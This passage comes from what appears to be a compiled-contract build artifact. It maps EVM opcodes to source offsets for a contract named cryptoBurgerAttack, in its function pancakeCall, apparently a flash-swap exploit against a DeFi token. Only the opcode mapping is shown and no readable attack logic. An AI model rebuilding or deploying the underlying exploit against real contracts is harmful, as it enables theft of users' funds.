      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8526,
        8530
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "6327": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8433,
        8540
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "6329": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8433,
        8540
      ],
      "op": "ADD",
      "path": "0"
    },
    "6330": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8433,
        8540
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2CED"
    },
    "6333": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        8433,
        8540
      ],
      "op": "JUMP",
      "path": "0"
    },
    "6334": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8433,
        8540
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "6335": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8433,
        8540
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "6337": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8433,
        8540
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "6339": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8433,
        8540
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "6340": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8433,
        8540
      ],
      "op": "DUP1",
      "path": "0"
    },
    "6341": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8433,
        8540
      ],
      "op": "DUP4",
      "path": "0"
    },
    "6342": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8433,
        8540
      ],
      "op": "SUB",
      "path": "0"
    },
    "6343": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8433,
        8540
      ],
      "op": "DUP2",
      "path": "0"
    },
    "6344": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8433,
        8540
      ],
      "op": "DUP7",
      "path": "0"
    },
    "6345": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8433,
        8540
      ],
      "op": "GAS",
      "path": "0"
    },
    "6346": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8433,
        8540
      ],
      "op": "STATICCALL",
      "path": "0"
    },
    "6347": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8433,
        8540
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "6348": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8433,
        8540
      ],
      "op": "DUP1",
      "path": "0"
    },
    "6349": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8433,
        8540
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "6350": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8433,
        8540
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x18DB"
    },
    "6353": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8433,
        8540
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "6354": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8433,
        8540
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "6355": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8433,
        8540
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "6357": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8433,
        8540
      ],
      "op": "DUP1",
      "path": "0"
    },
    "6358": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8433,
        8540
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "6359": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8433,
        8540
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "6360": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8433,
        8540
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "6362": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8433,
        8540
      ],
      "op": "REVERT",
      "path": "0"
    },
    "6363": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8433,
        8540
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "6364": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8433,
        8540
      ],
      "op": "POP",
      "path": "0"
    },
    "6365": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8433,
        8540
      ],
      "op": "POP",
      "path": "0"
    },
    "6366": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8433,
        8540
      ],
      "op": "POP",
      "path": "0"
    },
    "6367": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8433,
        8540
      ],
      "op": "POP",
      "path": "0"
    },
    "6368": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8433,
        8540
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "6370": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8433,
        8540
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "6371": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8433,
        8540
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "6372": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8433,
        8540
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "6374": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8433,
        8540
      ],
      "op": "DUP3",
      "path": "0"
    },
    "6375": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8433,
        8540
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "6376": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8433,
        8540
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "6378": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8433,
        8540
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "6379": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8433,
        8540
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "6380": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8433,
        8540
      ],
      "op": "DUP2",
      "path": "0"
    },
    "6381": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8433,
        8540
      ],
      "op": "ADD",
      "path": "0"
    },
    "6382": {
      "op": "PUSH1",
      "value": "0x1F"
    },
    "6384": {
      "op": "NOT"
    },
    "6385": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8433,
        8540
      ],
      "op": "AND",
      "path": "0"
    },
    "6386": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8433,
        8540
      ],
      "op": "DUP3",
      "path": "0"
    },
    "6387": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8433,
        8540
      ],
      "op": "ADD",
      "path": "0"
    },
    "6388": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8433,
        8540
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "6390": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8433,
        8540
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "6391": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8433,
        8540
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x1903"
    },
    "6394": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8433,
        8540
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "6395": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8433,
        8540
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "6396": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8433,
        8540
      ],
      "op": "DUP2",
      "path": "0"
    },
    "6397": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8433,
        8540
      ],
      "op": "ADD",
      "path": "0"
    },
    "6398": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8433,
        8540
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "6399": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8433,
        8540
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2D0E"
    },
    "6402": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        8433,
        8540
      ],
      "op": "JUMP",
      "path": "0"
    },
    "6403": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8433,
        8540
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "6404": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8418,
        8540
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "6405": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8418,
        8540
      ],
      "op": "POP",
      "path": "0"
    },
    "6406": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8550,
        8614
      ],
      "op": "PUSH2",
      "path": "0",
      "statement": 56,
      "value": "0x1939"
    },
    "6409": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "6411": {
      "op": "DUP1"
    },
    "6412": {
      "op": "MLOAD"
    },
    "6413": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "6415": {
      "op": "PUSH2",
      "value": "0x2F9E"
    },
    "6418": {
      "op": "DUP4"
    },
    "6419": {
      "op": "CODECOPY"
    },
    "6420": {
      "op": "DUP2"
    },
    "6421": {
      "op": "MLOAD"
    },
    "6422": {
      "op": "SWAP2"
    },
    "6423": {
      "op": "MSTORE"
    },
    "6424": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "6426": {
      "op": "DUP1"
    },
    "6427": {
      "op": "MLOAD"
    },
    "6428": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "6430": {
      "op": "PUSH2",
      "value": "0x2F7E"
    },
    "6433": {
      "op": "DUP4"
    },
    "6434": {
      "op": "CODECOPY"
    },
    "6435": {
      "op": "DUP2"
    },
    "6436": {
      "op": "MLOAD"
    },
    "6437": {
      "op": "SWAP2"
    },
    "6438": {
      "op": "MSTORE"
    },
    "6439": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8571,
        8583
      ],
      "op": "DUP4",
      "path": "0"
    },
    "6440": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8584,
        8585
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "6442": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8571,
        8586
      ],
      "op": "DUP2",
      "path": "0"
    },
    "6443": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8571,
        8586
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "6444": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8571,
        8586
      ],
      "op": "DUP2",
      "path": "0"
    },
    "6445": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8571,
        8586
      ],
      "op": "LT",
      "path": "0"
    },
    "6446": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8571,
        8586
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x614"
    },
    "6449": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8571,
        8586
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "6450": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8571,
        8586
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x614"
    },
    "6453": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8571,
        8586
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2C93"
    },
    "6456": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        8571,
        8586
      ],
      "op": "JUMP",
      "path": "0"
    },
    "6457": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8550,
        8614
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "6458": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8639,
        8746
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 57,
      "value": "0x40"
    },
    "6460": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8639,
        8746
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "6461": {
      "op": "PUSH4",
      "value": "0x7C0329D"
    },
    "6466": {
      "op": "PUSH1",
      "value": "0xE2"
    },
    "6468": {
      "op": "SHL"
    },
    "6469": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8639,
        8746
      ],
      "op": "DUP2",
      "path": "0"
    },
    "6470": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8639,
        8746
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "6471": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "6473": {
      "op": "DUP1"
    },
    "6474": {
      "op": "MLOAD"
    },
    "6475": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "6477": {
      "op": "PUSH2",
      "value": "0x2FBE"
    },
    "6480": {
      "op": "DUP4"
    },
    "6481": {
      "op": "CODECOPY"
    },
    "6482": {
      "op": "DUP2"
    },
    "6483": {
      "op": "MLOAD"
    },
    "6484": {
      "op": "SWAP2"
    },
    "6485": {
      "op": "MSTORE"
    },
    "6486": {
      "offset": [
        526,
        568
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "6487": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8639,
        8689
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x1F00CA74"
    },
    "6492": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8639,
        8689
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "6493": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8639,
        8746
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x196C"
    },
    "6496": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8639,
        8746
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "6497": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8703,
        8718
      ],
      "op": "DUP7",
      "path": "0"
    },
    "6498": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8703,
        8718
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "6499": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8732,
        8736
      ],
      "op": "DUP7",
      "path": "0"
    },
    "6500": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8732,
        8736
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "6501": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8639,
        8746
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "6503": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8639,
        8746
      ],
      "op": "ADD",
      "path": "0"
    },
    "6504": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8639,
        8746
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2CED"
    },
    "6507": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        8639,
        8746
      ],
      "op": "JUMP",
      "path": "0"
    },
    "6508": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8639,
        8746
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "6509": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8639,
        8746
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "6511": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8639,
        8746
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "6513": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8639,
        8746
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "6514": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8639,
        8746
      ],
      "op": "DUP1",
      "path": "0"
    },
    "6515": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8639,
        8746
      ],
      "op": "DUP4",
      "path": "0"
    },
    "6516": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8639,
        8746
      ],
      "op": "SUB",
      "path": "0"
    },
    "6517": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8639,
        8746
      ],
      "op": "DUP2",
      "path": "0"
    },
    "6518": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8639,
        8746
      ],
      "op": "DUP7",
      "path": "0"
    },
    "6519": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8639,
        8746
      ],
      "op": "GAS",
      "path": "0"
    },
    "6520": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8639,
        8746
      ],
      "op": "STATICCALL",
      "path": "0"
    },
    "6521": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8639,
        8746
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "6522": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8639,
        8746
      ],
      "op": "DUP1",
      "path": "0"
    },
    "6523": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8639,
        8746
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "6524": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8639,
        8746
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x1989"
    },
    "6527": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8639,
        8746
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "6528": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8639,
        8746
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "6529": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8639,
        8746
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "6531": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8639,
        8746
      ],
      "op": "DUP1",
      "path": "0"
    },
    "6532": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8639,
        8746
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "6533": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8639,
        8746
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "6534": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8639,
        8746
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "6536": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8639,
        8746
      ],
      "op": "REVERT",
      "path": "0"
    },
    "6537": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8639,
        8746
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "6538": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8639,
        8746
      ],
      "op": "POP",
      "path": "0"
    },
    "6539": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8639,
        8746
      ],
      "op": "POP",
      "path": "0"
    },
    "6540": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8639,
        8746
      ],
      "op": "POP",
      "path": "0"
    },
    "6541": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8639,
        8746
      ],
      "op": "POP",
      "path": "0"
    },
    "6542": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8639,
        8746
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "6544": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8639,
        8746
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "6545": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8639,
        8746
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "6546": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8639,
        8746
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "6548": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8639,
        8746
      ],
      "op": "DUP3",
      "path": "0"
    },
    "6549": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8639,
        8746
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "6550": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8639,
        8746
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "6552": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8639,
        8746
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "6553": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8639,
        8746
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "6554": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8639,
        8746
      ],
      "op": "DUP2",
      "path": "0"
    },
    "6555": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8639,
        8746
      ],
      "op": "ADD",
      "path": "0"
    },
    "6556": {
      "op": "PUSH1",
      "value": "0x1F"
    },
    "6558": {
      "op": "NOT"
    },
    "6559": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8639,
        8746
      ],
      "op": "AND",
      "path": "0"
    },
    "6560": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8639,
        8746
      ],
      "op": "DUP3",
      "path": "0"
    },
    "6561": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8639,
        8746
      ],
      "op": "ADD",
      "path": "0"
    },
    "6562": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8639,
        8746
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "6564": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8639,
        8746
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "6565": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8639,
        8746
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x19B1"
    },
    "6568": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8639,
        8746
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "6569": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8639,
        8746
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "6570": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8639,
        8746
      ],
      "op": "DUP2",
      "path": "0"
    },
    "6571": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8639,
        8746
      ],
      "op": "ADD",
      "path": "0"
    },
    "6572": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8639,
        8746
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "6573": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8639,
        8746
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2D0E"
    },
    "6576": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        8639,
        8746
      ],
      "op": "JUMP",
      "path": "0"
    },
    "6577": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8639,
        8746
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "6578": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8624,
        8746
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "6579": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8624,
        8746
      ],
      "op": "POP",
      "path": "0"
    },
    "6580": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8756,
        8820
      ],
      "op": "PUSH2",
      "path": "0",
      "statement": 58,
      "value": "0x19E7"
    },
    "6583": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "6585": {
      "op": "DUP1"
    },
    "6586": {
      "op": "MLOAD"
    },
    "6587": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "6589": {
      "op": "PUSH2",
      "value": "0x2F9E"
    },
    "6592": {
      "op": "DUP4"
    },
    "6593": {
      "op": "CODECOPY"
    },
    "6594": {
      "op": "DUP2"
    },
    "6595": {
      "op": "MLOAD"
    },
    "6596": {
      "op": "SWAP2"
    },
    "6597": {
      "op": "MSTORE"
    },
    "6598": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "6600": {
      "op": "DUP1"
    },
    "6601": {
      "op": "MLOAD"
    },
    "6602": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "6604": {
      "op": "PUSH2",
      "value": "0x2F7E"
    },
    "6607": {
      "op": "DUP4"
    },
    "6608": {
      "op": "CODECOPY"
    },
    "6609": {
      "op": "DUP2"
    },
    "6610": {
      "op": "MLOAD"
    },
    "6611": {
      "op": "SWAP2"
    },
    "6612": {
      "op": "MSTORE"
    },
    "6613": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8777,
        8789
      ],
      "op": "DUP4",
      "path": "0"
    },
    "6614": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8790,
        8791
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "6616": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8777,
        8792
      ],
      "op": "DUP2",
      "path": "0"
    },
    "6617": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8777,
        8792
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "6618": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8777,
        8792
      ],
      "op": "DUP2",
      "path": "0"
    },
    "6619": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8777,
        8792
      ],
      "op": "LT",
      "path": "0"
    },
    "6620": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8777,
        8792
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x614"
    },
    "6623": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8777,
        8792
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "6624": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8777,
        8792
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x614"
    },
    "6627": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8777,
        8792
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2C93"
    },
    "6630": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        8777,
        8792
      ],
      "op": "JUMP",
      "path": "0"
    },
    "6631": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8756,
        8820
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "6632": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8846,
        8953
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 59,
      "value": "0x40"
    },
    "6634": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8846,
        8953
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "6635": {
      "op": "PUSH4",
      "value": "0x7C0329D"
    },
    "6640": {
      "op": "PUSH1",
      "value": "0xE2"
    },
    "6642": {
      "op": "SHL"
    },
    "6643": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8846,
        8953
      ],
      "op": "DUP2",
      "path": "0"
    },
    "6644": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8846,
        8953
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "6645": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "6647": {
      "op": "DUP1"
    },
    "6648": {
      "op": "MLOAD"
    },
    "6649": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "6651": {
      "op": "PUSH2",
      "value": "0x2FBE"
    },
    "6654": {
      "op": "DUP4"
    },
    "6655": {
      "op": "CODECOPY"
    },
    "6656": {
      "op": "DUP2"
    },
    "6657": {
      "op": "MLOAD"
    },
    "6658": {
      "op": "SWAP2"
    },
    "6659": {
      "op": "MSTORE"
    },
    "6660": {
      "offset": [
        526,
        568
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "6661": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8846,
        8896
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x1F00CA74"
    },
    "6666": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8846,
        8896
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "6667": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        8846,
        8953
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x1A1A"
    },
